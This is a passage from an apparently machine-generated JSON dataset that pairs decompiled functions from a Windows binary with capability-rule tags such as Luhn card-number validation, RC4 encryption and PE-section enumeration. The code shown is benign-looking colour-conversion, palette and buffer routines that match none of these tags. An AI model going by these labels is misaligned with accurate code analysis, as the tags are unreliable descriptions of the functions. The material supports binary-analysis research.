        "decompiled_code": "\nuint __fastcall fcn.0042f604(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0042f51c();\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 130
    },
    "0042f6b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042f6b4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x42f6cc;\n    fcn.00422b50();\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    puStack24 = 0x42f6e2;\n    fcn.0040546c();\n    if (*(in_EAX + 4) != 0) {\n        uStack28 = 0x42f711;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00404640();\n        *(in_EAX + 4) = 0;\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x42f723;\n        fcn.0042f49c();\n        *(in_EAX + 9) = 0;\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "0043025c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043025c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.00404610();\n    *0x4aaa7c = fcn.0042f604();\n    fcn.00430180();\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 5) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 183
    },
    "004303ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004303ac(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x430496;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x4303da;\n    piVar1 = fcn.00404610();\n    puStack52 = 0x4303e9;\n    fcn.0042f604();\n    uStack56 = 0x430471;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.0042f6a4();\n    fcn.0040546c();\n    iVar2 = (**(*piVar1 + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            (**(*piVar1 + 0xc))(0);\n            uStack56 = 0;\n            uStack60 = 0x4304ac;\n            fcn.00405800();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004054c0();\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x430478;\n    uStack56 = 0x430468;\n    fcn.00404640();\n    uStack56 = 0x430470;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 428
    },
    "00431540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00431540(void)\n\n{\n    fcn.0043159c();\n    fcn.004316e4();\n    return;\n}\n",
        "token_count": 33
    },
    "00431564": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431564(uint *param_1)\n\n{\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    fcn.00430ae8();\n    fcn.00430b0c();\n    fcn.00430ba0();\n    *param_1 = uStack28;\n    param_1[1] = uStack24;\n    param_1[2] = uStack20;\n    param_1[3] = uStack16;\n    return;\n}\n",
        "token_count": 120
    },
    "004316e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004316e4(void)\n\n{\n    uint8_t *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    \n    fcn.00405b8c();\n    pcVar1 = fcn.004058fc();\n    iVar2 = 0x10;\n    do {\n        *pcVar1 = \"0123456789abcdefZ\"[*in_EAX >> 4];\n        pcVar1[1] = \"0123456789abcdefZ\"[*in_EAX & 0xf];\n        pcVar1 = pcVar1 + 2;\n        in_EAX = in_EAX + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 165
    },
    "00431914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid fcn.00431914(void)\n\n{\n    float10 in_ST0;\n    uint var_8h;\n    \n    fcn.0040344c(in_ST0);\n    return;\n}\n",
        "token_count": 58
    },
    "00431998": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00431998(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4319fd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    var_8h = *(*in_EAX + 0x14);\n    var_4h._0_1_ = 0;\n    arg_ch = &var_8h;\n    arg_8h = 0;\n    fcn.00407480();\n    fcn.0040da34(arg_8h, arg_ch);\n    fcn.00404eb4();\n    *in_FS_OFFSET = arg_8h;\n    uStack32 = 0x431a04;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 251
    },
    "00431a5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00431a5c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0042a100();\n    fcn.00432a2c();\n    *(in_EAX + 0x3f) = *0x4a2148;\n    *(in_EAX + 0x3d) = *0x4a2149;\n    *(in_EAX + 0x42) = *0x4a214a;\n    *(in_EAX + 0x3e) = *0x4a214b;\n    *(in_EAX + 0x40) = *0x4a214c;\n    *(in_EAX + 0x41) = *0x4a214d;\n    *(in_EAX + 0x43) = *0x4a214e;\n    *(in_EAX + 0x3c) = *0x4a214f;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 308
    },
    "00432434": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432434(uint param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uchar auStack1040 [1024];\n    \n    puStack1048 = &stack0xfffffbf0;\n    uStack1052 = 0x100;\n    uStack1056 = 0;\n    uStack1064 = 0x432452;\n    uStack1060 = param_2;\n    iVar3 = sub.gdi32.dll_GetPaletteEntries();\n    if (iVar3 != 0) {\n        uStack1064 = 3;\n        uVar4 = (**(*(in_EAX + 4) + 8))();\n        *(in_EAX + 0x88) = uVar4;\n        *(in_EAX + 0x84) = iVar3;\n        if (-1 < iVar3 + -1) {\n            iVar5 = 0;\n            puVar2 = &stack0xfffffbd8;\n            do {\n                piVar1 = *(in_EAX + 0x88);\n                *(piVar1[2] + iVar5) = puVar2[4];\n                *(piVar1[1] + iVar5) = puVar2[5];\n                *(*piVar1 + iVar5) = puVar2[6];\n                iVar5 = iVar5 + 1;\n                iVar3 = iVar3 + -1;\n                puVar2 = puVar2 + 4;\n            } while (iVar3 != 0);\n        }\n    }\n    return;\n}\n",
        "token_count": 404
    },
    "00432d8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00432d8c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    in_EAX[1] = 0;\n    if (param_2 != 0x3e) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xc;\n        *(iVar2 + 0x18) = 0x3e;\n        *(iVar2 + 0x1c) = param_2;\n        (***in_EAX)();\n    }\n    if (param_1 != 0x1d0) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x15;\n        *(iVar2 + 0x18) = 0x1d0;\n        *(iVar2 + 0x1c) = param_1;\n        (***in_EAX)();\n    }\n    iVar2 = *in_EAX;\n    iVar1 = in_EAX[3];\n    fcn.004318ac(in_EAX, 0, 0x1d0);\n    *in_EAX = iVar2;\n    in_EAX[3] = iVar1;\n    in_EAX[4] = 1;\n    fcn.00433db0();\n    in_EAX[2] = 0;\n    piVar3 = in_EAX + 0x29;\n    in_EAX[6] = 0;\n    iVar2 = 0;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    iVar2 = 0;\n    piVar3 = in_EAX + 0x2d;\n    do {\n        iVar2 = iVar2 + 1;\n        *piVar3 = 0;\n        piVar3[4] = 0;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 < 4);\n    in_EAX[0x4c] = 0;\n    fcn.0043e35c();\n    fcn.00434404();\n    in_EAX[5] = 200;\n    return;\n}\n",
        "token_count": 525
    },
    "00433468": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00433468(uint32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    var_14h = 0x3b9ac9f4 / in_ECX;\n    if (var_14h == 0) {\n        *(*in_EAX + 0x14) = 0x46;\n        (***in_EAX)();\n    }\n    if (arg_8h <= var_14h) {\n        var_14h = arg_8h;\n    }\n    *(iVar1 + 0x50) = var_14h;\n    iVar1 = fcn.00433298();\n    var_18h = 0;\n    if (arg_8h != 0) {\n        do {\n            if (arg_8h - var_18h <= var_14h) {\n                var_14h = arg_8h - var_18h;\n            }\n            iVar2 = fcn.004333c8();\n            piVar3 = iVar1 + var_18h * 4;\n            for (uVar4 = var_14h; uVar4 != 0; uVar4 = uVar4 - 1) {\n                *piVar3 = iVar2;\n                var_18h = var_18h + 1;\n                piVar3 = piVar3 + 1;\n                iVar2 = iVar2 + in_ECX;\n            }\n        } while (var_18h < arg_8h);\n    }\n    return iVar1;\n}\n",
        "token_count": 427
    },
    "00434b8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00434b8c(void)\n\n{\n    int32_t in_EAX;\n    int32_t arg_8h;\n    int32_t iVar1;\n    uchar *puVar2;\n    \n    arg_8h = (***(in_EAX + 4))();\n    puVar2 = arg_8h + 0x100;\n    *(in_EAX + 0x144) = puVar2;\n    fcn.004318ac(arg_8h, 0, 0x100);\n    iVar1 = 0;\n    do {\n        *puVar2 = iVar1;\n        iVar1 = iVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (iVar1 < 0x100);\n    iVar1 = 0x80;\n    puVar2 = arg_8h + 0x200;\n    do {\n        *puVar2 = 0xff;\n        iVar1 = iVar1 + 1;\n        puVar2 = puVar2 + 1;\n    } while (iVar1 < 0x200);\n    fcn.004318ac(arg_8h + 0x380, 0, 0x180);\n    fcn.004318c0(arg_8h + 0x500, *(in_EAX + 0x144), 0x80);\n    return;\n}\n",
        "token_count": 298
    },
    "00435d04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00435d04(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1bc) = puVar1;\n    *puVar1 = 0x435050;\n    iVar2 = 0;\n    puVar1 = puVar1 + 0xb;\n    do {\n        iVar2 = iVar2 + 1;\n        *puVar1 = 0;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0xa0) = puVar1;\n    for (iVar2 = 0; iVar2 < *(in_EAX + 0x24); iVar2 = iVar2 + 1) {\n        iVar3 = 0;\n        do {\n            *puVar1 = 0xffffffff;\n            puVar1 = puVar1 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x40);\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "004368c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004368c4(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1bc) = puVar1;\n    *puVar1 = 0x435d78;\n    puVar1[1] = 0x436460;\n    iVar2 = 0;\n    puVar1 = puVar1 + 0xe;\n    do {\n        *puVar1 = 0;\n        puVar1[-4] = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 173
    },
    "00436904": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid fcn.00436904(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar1 = *(in_EAX + 0x1c4);\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x10) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x14) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x18) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x1c) = uVar2;\n    iVar3 = 0;\n    iVar5 = -0x80;\n    do {\n        *(*(iVar1 + 0x10) + iVar3 * 4) = iVar5 * 0x166e9 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0x14) + iVar3 * 4) = iVar5 * 0x1c5a2 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0x18) + iVar3 * 4) = iVar5 * -0xb6d2;\n        iVar4 = iVar5 * -0x581a;\n        iVar5 = iVar5 + 1;\n        *(*(iVar1 + 0x1c) + iVar3 * 4) = iVar4 + 0x8000;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x100);\n    return;\n}\n",
        "token_count": 399
    },
    "00436a88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436a88(uint noname_0, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    (**(*(in_EAX + 0x1c4) + 0xc))(*arg_ch * 4 + arg_10h);\n    *arg_ch = *arg_ch + 1;\n    *in_ECX = *in_ECX + 1;\n    return;\n}\n",
        "token_count": 119
    },
    "00436ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/c6eee0698c4b4bd09944ca66a2e4c269"
        ],
        "decompiled_code": "\nvoid fcn.00436ef0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    \n    iVar1 = *(in_EAX + 0x1c8);\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 8) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0xc) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x10) = uVar2;\n    uVar2 = (***(in_EAX + 4))();\n    *(iVar1 + 0x14) = uVar2;\n    iVar3 = 0;\n    iVar5 = -0x80;\n    do {\n        *(*(iVar1 + 8) + iVar3 * 4) = iVar5 * 0x166e9 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0xc) + iVar3 * 4) = iVar5 * 0x1c5a2 + 0x8000 >> 0x10;\n        *(*(iVar1 + 0x10) + iVar3 * 4) = iVar5 * -0xb6d2;\n        iVar4 = iVar5 * -0x581a;\n        iVar5 = iVar5 + 1;\n        *(*(iVar1 + 0x14) + iVar3 * 4) = iVar4 + 0x8000;\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x100);\n    return;\n}\n",
        "token_count": 392
    },
    "00436fa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436fa8(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t in_EAX;\n    uchar *puVar9;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar10;\n    uint8_t *var_34h;\n    uint8_t *var_30h;\n    uint8_t *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c8);\n    uVar4 = *(in_EAX + 0x70);\n    iVar5 = *(in_EAX + 0x144);\n    iVar6 = *(iVar3 + 8);\n    iVar7 = *(iVar3 + 0xc);\n    iVar8 = *(iVar3 + 0x10);\n    iVar3 = *(iVar3 + 0x14);\n    var_8h = in_ECX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        var_2ch = *(*in_EDX + var_8h * 4);\n        var_30h = *(in_EDX[1] + var_8h * 4);\n        var_34h = *(in_EDX[2] + var_8h * 4);\n        var_8h = var_8h + 1;\n        puVar9 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_14h = 0;\n        if (uVar4 != 0) {\n            do {\n                uVar10 = *var_2ch;\n                uVar1 = *var_30h;\n                uVar2 = *var_34h;\n                puVar9[2] = *(iVar5 + uVar10 + *(iVar6 + uVar2 * 4));\n                puVar9[1] = *(iVar5 + uVar10 + (*(iVar3 + uVar1 * 4) + *(iVar8 + uVar2 * 4) >> 0x10));\n                *puVar9 = *(iVar5 + uVar10 + *(iVar7 + uVar1 * 4));\n                puVar9 = puVar9 + 3;\n                var_14h = var_14h + 1;\n                var_34h = var_34h + 1;\n                var_30h = var_30h + 1;\n                var_2ch = var_2ch + 1;\n            } while (var_14h < uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 702
    },
    "004370b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004370b0(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t *var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x24);\n    iVar2 = *(in_EAX + 0x70);\n    while (arg_8h = arg_8h + -1,  -1 < arg_8h) {\n        var_ch = 0;\n        var_10h = in_EDX;\n        if (0 < iVar1) {\n            do {\n                puVar4 = *arg_ch + var_ch;\n                puVar3 = *(*var_10h + in_ECX * 4);\n                for (iVar5 = iVar2; iVar5 != 0; iVar5 = iVar5 + -1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + iVar1;\n                }\n                var_ch = var_ch + 1;\n                var_10h = var_10h + 1;\n            } while (var_ch < iVar1);\n        }\n        in_ECX = in_ECX + 1;\n        arg_ch = arg_ch + 1;\n    }\n    return;\n}\n",
        "token_count": 358
    },
    "00437140": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437140(int32_t arg_8h, uint *arg_ch)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    uchar *puVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    uVar2 = *(in_EAX + 0x70);\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        uVar5 = 0;\n        puVar4 = *(*in_EDX + in_ECX * 4);\n        in_ECX = in_ECX + 1;\n        puVar3 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        if (uVar2 != 0) {\n            do {\n                uVar1 = *puVar4;\n                *puVar3 = uVar1;\n                puVar3[1] = uVar1;\n                puVar3[2] = uVar1;\n                puVar3 = puVar3 + 3;\n                uVar5 = uVar5 + 1;\n                puVar4 = puVar4 + 1;\n            } while (uVar5 < uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 311
    },
    "00437188": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437188(int32_t arg_8h, uint *arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t in_EAX;\n    uchar *puVar9;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar10;\n    uchar *var_3ch;\n    uint8_t *var_38h;\n    uint8_t *var_34h;\n    uint8_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EAX + 0x1c8);\n    uVar4 = *(in_EAX + 0x70);\n    iVar5 = *(in_EAX + 0x144);\n    iVar6 = *(iVar3 + 8);\n    iVar7 = *(iVar3 + 0xc);\n    iVar8 = *(iVar3 + 0x10);\n    iVar3 = *(iVar3 + 0x14);\n    var_8h = in_ECX;\n    while( true ) {\n        arg_8h = arg_8h + -1;\n        if (arg_8h < 0) break;\n        var_30h = *(*in_EDX + var_8h * 4);\n        var_34h = *(in_EDX[1] + var_8h * 4);\n        var_38h = *(in_EDX[2] + var_8h * 4);\n        var_3ch = *(in_EDX[3] + var_8h * 4);\n        var_8h = var_8h + 1;\n        puVar9 = *arg_ch;\n        arg_ch = arg_ch + 1;\n        var_18h = 0;\n        if (uVar4 != 0) {\n            do {\n                uVar10 = *var_30h;\n                uVar1 = *var_34h;\n                uVar2 = *var_38h;\n                *puVar9 = *(iVar5 + (0xff - (*(iVar6 + uVar2 * 4) + uVar10)));\n                puVar9[1] = *(iVar5 + (0xff - ((*(iVar3 + uVar1 * 4) + *(iVar8 + uVar2 * 4) >> 0x10) + uVar10)));\n                puVar9[2] = *(iVar5 + (0xff - (uVar10 + *(iVar7 + uVar1 * 4))));\n                puVar9[3] = *var_3ch;\n                puVar9 = puVar9 + 4;\n                var_18h = var_18h + 1;\n                var_3ch = var_3ch + 1;\n                var_38h = var_38h + 1;\n                var_34h = var_34h + 1;\n                var_30h = var_30h + 1;\n            } while (var_18h < uVar4);\n        }\n    }\n    return;\n}\n",
        "token_count": 782
    },
    "0043799c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0043799c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    \n    iVar1 = *(in_EAX + 0x1cc);\n    iVar5 = 0;\n    piVar6 = iVar1 + 0x20;\n    do {\n        if (*(in_EAX + 0x78) <= iVar5) {\n            return;\n        }\n        iVar3 = 0;\n        iVar4 = 0;\n        piVar2 = iVar1 + 0x20;\n        if (0 < iVar5) {\n            do {\n                if (*piVar6 == *piVar2) {\n                    iVar3 = piVar2[5];\n                    break;\n                }\n                iVar4 = iVar4 + 1;\n                piVar2 = piVar2 + 1;\n            } while (iVar4 < iVar5);\n        }\n        if (iVar3 == 0) {\n            iVar3 = fcn.004378fc();\n        }\n        piVar6[5] = iVar3;\n        iVar5 = iVar5 + 1;\n        piVar6 = piVar6 + 1;\n    } while( true );\n}\n",
        "token_count": 291
    },
    "00437aa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00437aa4(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t in_EAX;\n    uint8_t *puVar7;\n    uint8_t *puVar8;\n    uint8_t *puVar9;\n    char **in_ECX;\n    char *pcVar10;\n    uint8_t **in_EDX;\n    int32_t iVar11;\n    char **var_1ch;\n    uint8_t **var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = *(*(in_EAX + 0x1cc) + 0x18);\n    iVar3 = *piVar2;\n    iVar4 = piVar2[1];\n    iVar5 = piVar2[2];\n    iVar6 = *(in_EAX + 0x70);\n    var_10h = 0;\n    var_1ch = in_ECX;\n    var_18h = in_EDX;\n    if (0 < arg_8h) {\n        do {\n            puVar9 = *var_18h;\n            pcVar10 = *var_1ch;\n            for (iVar11 = iVar6; iVar11 != 0; iVar11 = iVar11 + -1) {\n                uVar1 = *puVar9;\n                puVar7 = puVar9 + 1;\n                puVar8 = puVar9 + 2;\n                puVar9 = puVar9 + 3;\n                *pcVar10 = *(iVar3 + uVar1) + *(iVar4 + *puVar7) + *(iVar5 + *puVar8);\n                pcVar10 = pcVar10 + 1;\n            }\n            var_10h = var_10h + 1;\n            var_1ch = var_1ch + 1;\n            var_18h = var_18h + 1;\n        } while (var_10h < arg_8h);\n    }\n    return;\n}\n",
        "token_count": 496
    },
    "00437b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
